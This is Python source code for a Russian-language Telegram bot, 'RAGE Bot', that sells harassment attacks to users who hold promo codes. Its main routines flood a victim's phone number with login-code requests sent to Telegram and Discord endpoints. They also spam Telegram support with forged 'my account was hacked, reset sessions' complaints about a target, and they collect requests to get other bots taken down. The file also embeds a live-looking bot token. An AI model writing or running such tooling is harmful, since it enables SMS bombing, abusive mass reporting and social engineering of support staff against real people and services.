import asyncio
import aiohttp
from fake_useragent import UserAgent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import sqlite3
import datetime
import time
import random

# База данных
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS promocodes
                     (code TEXT PRIMARY KEY, uses_left INTEGER, created_date TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                     (user_id INTEGER PRIMARY KEY, username TEXT, promo_used TEXT, 
                     attack_count INTEGER, total_requests INTEGER, is_active BOOLEAN DEFAULT 1,
                     join_date TEXT, last_activity TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS admin_users 
                     (user_id INTEGER PRIMARY KEY, username TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS bot_destruction_requests
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, user_username TEXT,
                     bot_username TEXT, request_date TEXT, status TEXT DEFAULT 'pending')''')
    conn.commit()
    conn.close()

init_db()

# Глобальные переменные
ADMIN_IDS = [8480811736, 7580074973, 7207603612]  # Замените на реальные ID админов
user_sessions = {}

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
    
    async def start_spam_attack(self, phone_number, user_id, update: Update):
        start_time = time.time()
        attack_duration = 180
        request_count = 0
        user_agent = UserAgent().random
        headers = {'user-agent': user_agent}
        
        await update.message.reply_text(f"🎯 Начинаю спам-атаку на номер: {phone_number}\n⏰ Длительность: 3 минуты")
        
        targets = [
            ('https://my.telegram.org/auth/send_password', 'post', {'phone': phone_number}),
            ('https://telegram.org/support?setln=ru', 'get', None),
            ('https://my.telegram.org/auth/', 'post', {'phone': phone_number}),
            ('https://discord.com/api/v9/auth/register/phone', 'post', {"phone": phone_number}),
            ('https://api.telegram.org/auth/send_code', 'post', {'phone': phone_number})
        ]
        
        async with aiohttp.ClientSession() as session:
            while time.time() - start_time < attack_duration:
                if not self.active_attacks.get(user_id, False):
                    break
                    
                try:
                    tasks = []
                    for _ in range(50):
                        for target in random.sample(targets, min(3, len(targets))):
                            url, method, data = target
                            if method == 'post':
                                if 'discord' in url:
                                    task = session.post(url, headers=headers, json=data, timeout=aiohttp.ClientTimeout(total=10))
                                else:
                                    task = session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=10))
                            else:
                                task = session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10))
                            tasks.append(task)
                    
                    completed_tasks = await asyncio.gather(*tasks, return_exceptions=True)
                    successful_requests = sum(1 for result in completed_tasks if not isinstance(result, Exception))
                    request_count += successful_requests
                    
                    elapsed = time.time() - start_time
                    if int(elapsed) % 15 == 0 and int(elapsed) > 0:
                        await update.message.reply_text(
                            f"📊 Статус спам-атаки:\n⏰ Прошло: {int(elapsed)} сек\n"
                            f"📨 Запросов: {request_count}\n⚡ Скорость: {request_count / max(1, elapsed):.1f} запр/сек"
                        )
                    
                    await asyncio.sleep(0.05)
                        
                except Exception:
                    continue
        
        conn = sqlite3.connect('bot_data.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET attack_count = attack_count + 1, total_requests = total_requests + ? WHERE user_id = ?", 
                      (request_count, user_id))
        conn.commit()
        conn.close()
        
        self.active_attacks.pop(user_id, None)
        await update.message.reply_text(
            f"✅ Спам-атака завершена!\n📊 Итоги:\n⏰ Время: 3 минуты\n"
            f"📨 Запросов: {request_count}\n⚡ Скорость: {request_count / 180:.1f} запр/сек"
        )

    async def start_support_attack(self, username, phone_number, user_id, update: Update):
        start_time = time.time()
        attack_duration = 180
        request_count = 0
        
        text_templates = [
            f"Hello, dear support, my account {username} has been scammed and they are not letting me log in. I have a lot of important documents there. Please reset my sessions so I can log in.",
            f"Здравствуйте, уважаемая поддержка, на мой аккаунт {username}, зашли мошенники, они не дают мне войти в аккаунт, у меня там много важных документов, обнулите сессии чтобы я смог войти в аккаунт.",
            f"Help! My account {username} was hacked! I can't access my important messages and files. Please help me recover my account immediately!",
            f"Срочная помощь! Мой аккаунт {username} взломали! Мошенники поменяли пароль и привязали свой номер. Верните мне доступ к аккаунту!"
        ]
        
        await update.message.reply_text(
            f"🎯 Начинаю атаку жалобами!\n👤 Username: {username}\n"
            f"📞 Номер: {phone_number}\n⏰ Длительность: 3 минуты"
        )
        
        async with aiohttp.ClientSession() as session:
            while time.time() - start_time < attack_duration:
                if not self.active_attacks.get(user_id, False):
                    break
                    
                try:
                    tasks = []
                    for _ in range(50):
                        chosen_text = random.choice(text_templates)
                        headers = {
                            'User-Agent': UserAgent().random,
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                        payload = {'text': chosen_text, 'contact': phone_number}
                        task = session.post('https://telegram.org/support', data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10))
                        tasks.append(task)
                    
                    completed_tasks = await asyncio.gather(*tasks, return_exceptions=True)
                    successful_requests = sum(1 for result in completed_tasks if not isinstance(result, Exception))
                    request_count += successful_requests
                    
                    elapsed = time.time() - start_time
                    if int(elapsed) % 15 == 0 and int(elapsed) > 0:
                        await update.message.reply_text(
                            f"📊 Статус жалоб:\n⏰ Прошло: {int(elapsed)} сек\n"
                            f"📨 Жалоб: {request_count}\n⚡ Скорость: {request_count / max(1, elapsed):.1f} жалоб/сек"
                        )
                    
                    await asyncio.sleep(0.05)
                        
                except Exception:
                    continue
        
        conn = sqlite3.connect('bot_data.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET attack_count = attack_count + 1, total_requests = total_requests + ? WHERE user_id = ?", 
                      (request_count, user_id))
        conn.commit()
        conn.close()
        
        self.active_attacks.pop(user_id, None)
        await update.message.reply_text(
            f"✅ Атака жалобами завершена!\n📊 Итоги:\n⏰ Время: 3 минуты\n"
            f"📨 Жалоб: {request_count}\n⚡ Скорость: {request_count / 180:.1f} жалоб/сек"
        )

attack_manager = AttackManager()

# Inline клавиатуры
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎯 Спам на номер", callback_data='spam_attack')],
        [InlineKeyboardButton("📞 Жалобы в поддержку", callback_data='support_attack')],
        [InlineKeyboardButton("🤖 Снос ботов", callback_data='bot_destruction')],
        [InlineKeyboardButton("📊 Моя статистика", callback_data='my_stats')],
        [InlineKeyboardButton("🆘 Помощь", callback_data='help')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 Список пользователей", callback_data='user_list')],
        [InlineKeyboardButton("📊 Общая статистика", callback_data='global_stats')],
        [InlineKeyboardButton("🎫 Добавить промокод", callback_data='add_promo')],
        [InlineKeyboardButton("📢 Рассылка", callback_data='broadcast')],
        [InlineKeyboardButton("🤖 Запросы на снос ботов", callback_data='bot_requests')],
        [InlineKeyboardButton("⚙️ Управление доступом", callback_data='manage_access')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard(users):
    keyboard = []
    for user in users:
        user_id, username, is_active = user
        status = "✅" if is_active else "❌"
        btn_text = f"{status} {username or 'No name'} ({user_id})"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f'toggle_user_{user_id}')])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data='admin_panel')])
    return InlineKeyboardMarkup(keyboard)

def get_bot_requests_keyboard(requests):
    keyboard = []
    for req in requests:
        req_id, user_id, user_username, bot_username, request_date, status = req
        status_icon = "⏳" if status == 'pending' else "✅" if status == 'completed' else "❌"
        btn_text = f"{status_icon} {bot_username} от {user_username}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f'bot_request_{req_id}')])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data='admin_panel')])
    return InlineKeyboardMarkup(keyboard)

def get_bot_request_detail_keyboard(req_id):
    keyboard = [
        [InlineKeyboardButton("✅ Выполнено", callback_data=f'complete_bot_req_{req_id}')],
        [InlineKeyboardButton("❌ Отклонить", callback_data=f'reject_bot_req_{req_id}')],
        [InlineKeyboardButton("◀️ Назад к списку", callback_data='bot_requests')]
    ]
    return InlineKeyboardMarkup(keyboard)

# Команды для пользователей
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, attack_count, total_requests, join_date, last_activity) 
                     VALUES (?, ?, 0, 0, ?, ?)''', 
                  (user_id, username, datetime.datetime.now().isoformat(), datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text("👋 Добро пожаловать в RAGE Bot!\nВыберите тип атаки:", reply_markup=get_main_keyboard())

async def use_promo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Используйте: /promo [КОД]")
        return
    
    promo_code = context.args[0].upper()
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT uses_left FROM promocodes WHERE code = ?", (promo_code,))
    result = cursor.fetchone()
    
    if not result:
        await update.message.reply_text("❌ Неверный промокод")
        conn.close()
        return
    
    uses_left = result[0]
    if uses_left <= 0:
        await update.message.reply_text("❌ Промокод исчерпан")
        conn.close()
        return
    
    cursor.execute("UPDATE users SET promo_used = ? WHERE user_id = ?", (promo_code, user_id))
    cursor.execute("UPDATE promocodes SET uses_left = uses_left - 1 WHERE code = ?", (promo_code,))
    conn.commit()
    conn.close()
    
    await update.message.reply_text("✅ Промокод активирован! Выберите тип атаки:", reply_markup=get_main_keyboard())

# Обработчики inline кнопок
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == 'spam_attack':
        await query.edit_message_text("🎯 Введите номер телефона для спам-атаки:")
        user_sessions[user_id] = {'step': 'awaiting_phone_spam'}
        
    elif query.data == 'support_attack':
        await query.edit_message_text("👤 Введите username пользователя (без @):")
        user_sessions[user_id] = {'step': 'awaiting_username'}
        
    elif query.data == 'bot_destruction':
        conn = sqlite3.connect('bot_data.db')
        cursor = conn.cursor()
        cursor.execute("SELECT is_active, promo_used FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        if not result or not result[0]:
            await query.edit_message_text("❌ Ваш доступ заблокирован или не активирован")
            return
        
        if not result[1]:
            await query.edit_message_text("❌ Сначала активируйте промокод! Используйте /promo [КОД]")
            return
        
        await query.edit_message_text("🤖 Снос ботов\n\nНапишите username бота (например: @username)\n\n🔴 Важно: На боте должна быть аватарка телеграм!")
        user_sessions[user_id] = {'step': 'awaiting_bot_username'}
        
    elif query.data == 'my_stats':
        conn = sqlite3.connect('bot_data.db')
        cursor = conn.cursor()
        cursor.execute("SELECT attack_count, total_requests, promo_used FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            attack_count, total_requests, promo_used = result
            await query.edit_message_text(f"📊 Ваша статистика:\n🎯 Атак проведено: {attack_count}\n📨 Всего запросов: {total_requests}\n🎫 Промокод: {promo_used or 'Не активирован'}")
        else:
            await query.edit_message_text("❌ Статистика не найдена")
            
    elif query.data == 'help':
        await query.edit_message_text("🆘 Помощь:\n\n🎯 Спам на номер - массовая отправка запросов\n📞 Жалобы в поддержку - отправка жалоб в поддержку Telegram\n🤖 Снос ботов - отправка запроса на удаление бота\n📊 Статистика - просмотр вашей статистики\n\nИспользуйте /promo [код] для активации промокода")
    
    # Админские кнопки
    elif query.data == 'admin_panel':
        if user_id in ADMIN_IDS:
            await query.edit_message_text("👨‍💻 Панель администратора:", reply_markup=get_admin_keyboard())
    
    elif query.data == 'user_list':
        if user_id in ADMIN_IDS:
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT user_id, username, is_active FROM users ORDER BY last_activity DESC LIMIT 20")
            users = cursor.fetchall()
            conn.close()
            
            if users:
                await query.edit_message_text("👥 Последние 20 пользователей:", reply_markup=get_user_management_keyboard(users))
            else:
                await query.edit_message_text("❌ Пользователи не найдены")
    
    elif query.data.startswith('toggle_user_'):
        if user_id in ADMIN_IDS:
            target_user_id = int(query.data.split('_')[-1])
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT is_active FROM users WHERE user_id = ?", (target_user_id,))
            result = cursor.fetchone()
            
            if result:
                new_status = not result[0]
                cursor.execute("UPDATE users SET is_active = ? WHERE user_id = ?", (new_status, target_user_id))
                conn.commit()
                status_text = "активирован" if new_status else "деактивирован"
                await query.edit_message_text(f"✅ Пользователь {target_user_id} {status_text}")
            conn.close()
    
    elif query.data == 'global_stats':
        if user_id in ADMIN_IDS:
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM users")
            total_users = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM users WHERE is_active = 1")
            active_users = cursor.fetchone()[0]
            
            cursor.execute("SELECT SUM(attack_count) FROM users")
            total_attacks = cursor.fetchone()[0] or 0
            
            cursor.execute("SELECT SUM(total_requests) FROM users")
            total_requests = cursor.fetchone()[0] or 0
            
            cursor.execute("SELECT COUNT(*) FROM bot_destruction_requests")
            total_bot_requests = cursor.fetchone()[0] or 0
            
            active_attacks = len(attack_manager.active_attacks)
            
            conn.close()
            
            await query.edit_message_text(f"📊 Глобальная статистика:\n👥 Всего пользователей: {total_users}\n✅ Активных: {active_users}\n🎯 Всего атак: {total_attacks}\n📨 Всего запросов: {total_requests}\n🤖 Запросов на снос ботов: {total_bot_requests}\n⚡ Активных атак: {active_attacks}")
    
    elif query.data == 'broadcast':
        if user_id in ADMIN_IDS:
            await query.edit_message_text("📢 Введите сообщение для рассылки:")
            user_sessions[user_id] = {'step': 'awaiting_broadcast'}
    
    elif query.data == 'add_promo':
        if user_id in ADMIN_IDS:
            await query.edit_message_text("🎫 Введите промокод и количество использований через пробел:\nПример: PROMO123 50")
            user_sessions[user_id] = {'step': 'awaiting_promo'}
    
    elif query.data == 'bot_requests':
        if user_id in ADMIN_IDS:
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute('''SELECT id, user_id, user_username, bot_username, request_date, status 
                            FROM bot_destruction_requests ORDER BY request_date DESC LIMIT 20''')
            requests = cursor.fetchall()
            conn.close()
            
            if requests:
                await query.edit_message_text("🤖 Последние 20 запросов на снос ботов:", reply_markup=get_bot_requests_keyboard(requests))
            else:
                await query.edit_message_text("❌ Запросы на снос ботов не найдены")
    
    elif query.data.startswith('bot_request_'):
        if user_id in ADMIN_IDS:
            req_id = int(query.data.split('_')[-1])
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute('''SELECT id, user_id, user_username, bot_username, request_date, status 
                            FROM bot_destruction_requests WHERE id = ?''', (req_id,))
            request = cursor.fetchone()
            conn.close()
            
            if request:
                req_id, user_id, user_username, bot_username, request_date, status = request
                status_text = "⏳ Ожидает" if status == 'pending' else "✅ Выполнено" if status == 'completed' else "❌ Отклонено"
                
                await query.edit_message_text(f"🤖 Запрос на снос бота:\n\n👤 От пользователя: {user_username} (ID: {user_id})\n🤖 Бот: {bot_username}\n📅 Дата: {request_date}\n📊 Статус: {status_text}", reply_markup=get_bot_request_detail_keyboard(req_id))
    
    elif query.data.startswith('complete_bot_req_'):
        if user_id in ADMIN_IDS:
            req_id = int(query.data.split('_')[-1])
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute('''SELECT user_id, bot_username FROM bot_destruction_requests WHERE id = ?''', (req_id,))
            request = cursor.fetchone()
            
            if request:
                target_user_id, bot_username = request
                cursor.execute("UPDATE bot_destruction_requests SET status = 'completed' WHERE id = ?", (req_id,))
                conn.commit()
                
                try:
                    await context.bot.send_message(chat_id=target_user_id, text=f"✅ Ваш запрос на снос бота {bot_username} выполнен!")
                except Exception:
                    pass
                
                await query.edit_message_text(f"✅ Запрос на снос бота {bot_username} отмечен как выполненный")
            conn.close()
    
    elif query.data.startswith('reject_bot_req_'):
        if user_id in ADMIN_IDS:
            req_id = int(query.data.split('_')[-1])
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute('''SELECT user_id, bot_username FROM bot_destruction_requests WHERE id = ?''', (req_id,))
            request = cursor.fetchone()
            
            if request:
                target_user_id, bot_username = request
                cursor.execute("UPDATE bot_destruction_requests SET status = 'rejected' WHERE id = ?", (req_id,))
                conn.commit()
                
                try:
                    await context.bot.send_message(chat_id=target_user_id, text=f"❌ Ваш запрос на снос бота {bot_username} отклонен!")
                except Exception:
                    pass
                
                await query.edit_message_text(f"❌ Запрос на снос бота {bot_username} отклонен")
            conn.close()
    
    elif query.data == 'manage_access':
        if user_id in ADMIN_IDS:
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT user_id, username, is_active FROM users ORDER BY last_activity DESC LIMIT 20")
            users = cursor.fetchall()
            conn.close()
            
            if users:
                await query.edit_message_text("⚙️ Управление доступом:", reply_markup=get_user_management_keyboard(users))

# Обработчик сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    conn = sqlite3.connect('bot_data.db')
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET last_activity = ? WHERE user_id = ?", (datetime.datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()
    
    if user_id in user_sessions:
        session = user_sessions[user_id]
        
        if session['step'] == 'awaiting_phone_spam':
            phone_number = update.message.text.strip()
            
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT is_active, promo_used FROM users WHERE user_id = ?", (user_id,))
            result = cursor.fetchone()
            conn.close()
            
            if not result or not result[0]:
                await update.message.reply_text("❌ Ваш доступ заблокирован или не активирован")
                del user_sessions[user_id]
                return
            
            if not result[1]:
                await update.message.reply_text("❌ Сначала активируйте промокод! Используйте /promo [КОД]")
                del user_sessions[user_id]
                return
            
            if user_id in attack_manager.active_attacks:
                await update.message.reply_text("❌ Атака уже запущена!")
                del user_sessions[user_id]
                return
            
            attack_manager.active_attacks[user_id] = True
            asyncio.create_task(attack_manager.start_spam_attack(phone_number, user_id, update))
            del user_sessions[user_id]
            
        elif session['step'] == 'awaiting_username':
            username_input = update.message.text.strip()
            user_sessions[user_id] = {'step': 'awaiting_phone_support', 'username': username_input}
            await update.message.reply_text("📞 Теперь введите номер телефона:")
            
        elif session['step'] == 'awaiting_phone_support':
            phone_number = update.message.text.strip()
            username_input = session['username']
            
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT is_active, promo_used FROM users WHERE user_id = ?", (user_id,))
            result = cursor.fetchone()
            conn.close()
            
            if not result or not result[0]:
                await update.message.reply_text("❌ Ваш доступ заблокирован или не активирован")
                del user_sessions[user_id]
                return
            
            if not result[1]:
                await update.message.reply_text("❌ Сначала активируйте промокод! Используйте /promo [КОД]")
                del user_sessions[user_id]
                return
            
            if user_id in attack_manager.active_attacks:
                await update.message.reply_text("❌ Атака уже запущена!")
                del user_sessions[user_id]
                return
            
            attack_manager.active_attacks[user_id] = True
            asyncio.create_task(attack_manager.start_support_attack(username_input, phone_number, user_id, update))
            del user_sessions[user_id]
        
        elif session['step'] == 'awaiting_bot_username':
            bot_username = update.message.text.strip()
            
            if not bot_username.startswith('@'):
                await update.message.reply_text("❌ Username должен начинаться с @. Попробуйте снова:")
                return
            
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute('''INSERT INTO bot_destruction_requests (user_id, user_username, bot_username, request_date) VALUES (?, ?, ?, ?)''',
                         (user_id, username, bot_username, datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            
            for admin_id in ADMIN_IDS:
                try:
                    await context.bot.send_message(chat_id=admin_id, text=f"🤖 Новый запрос на снос бота!\n\n👤 От: @{username} (ID: {user_id})\n🤖 Бот: {bot_username}\n📅 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                except Exception:
                    pass
            
            await update.message.reply_text(f"✅ Запрос на снос бота {bot_username} отправлен!\n🔴 Важно: На боте должна быть аватарка телеграм!\n\nВы будете уведомлены, когда запрос будет выполнен.", reply_markup=get_main_keyboard())
            del user_sessions[user_id]
        
        # Админские функции
        elif session['step'] == 'awaiting_broadcast' and user_id in ADMIN_IDS:
            message_text = update.message.text
            conn = sqlite3.connect('bot_data.db')
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users WHERE is_active = 1")
            users = cursor.fetchall()
            conn.close()
            
            sent_count = 0
            for user in users:
                try:
                    await context.bot.send_message(chat_id=user[0], text=f"📢 Рассылка от админа:\n\n{message_text}")
                    sent_count += 1
                except Exception:
                    continue
            
            await update.message.reply_text(f"✅ Рассылка отправлена {sent_count} пользователям")
            del user_sessions[user_id]
        
        elif session['step'] == 'awaiting_promo' and user_id in ADMIN_IDS:
            parts = update.message.text.strip().split()
            if len(parts) == 2:
                promo_code, uses = parts[0].upper(), parts[1]
                try:
                    uses = int(uses)
                    conn = sqlite3.connect('bot_data.db')
                    cursor = conn.cursor()
                    cursor.execute("INSERT OR REPLACE INTO promocodes (code, uses_left, created_date) VALUES (?, ?, ?)", (promo_code, uses, datetime.datetime.now().isoformat()))
                    conn.commit()
                    conn.close()
                    await update.message.reply_text(f"✅ Промокод {promo_code} добавлен на {uses} использований")
                except ValueError:
                    await update.message.reply_text("❌ Неверное количество использований")
            else:
                await update.message.reply_text("❌ Неверный формат. Пример: PROMO123 50")
            del user_sessions[user_id]

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in attack_manager.active_attacks:
        attack_manager.active_attacks[user_id] = False
        await update.message.reply_text("🛑 Атака остановлена")
    else:
        await update.message.reply_text("❌ Нет активной атаки")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in ADMIN_IDS:
        await update.message.reply_text("👨‍💻 Панель администратора:", reply_markup=get_admin_keyboard())
    else:
        await update.message.reply_text("❌ Нет доступа")

def main():
    application = Application.builder().token("8506102494:AAEbJmLylfAhi3Vcq9XVIEb2MqreymgIwCk").build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("promo", use_promo))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("admin", admin_panel))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling()

if __name__ == '__main__':
    main()
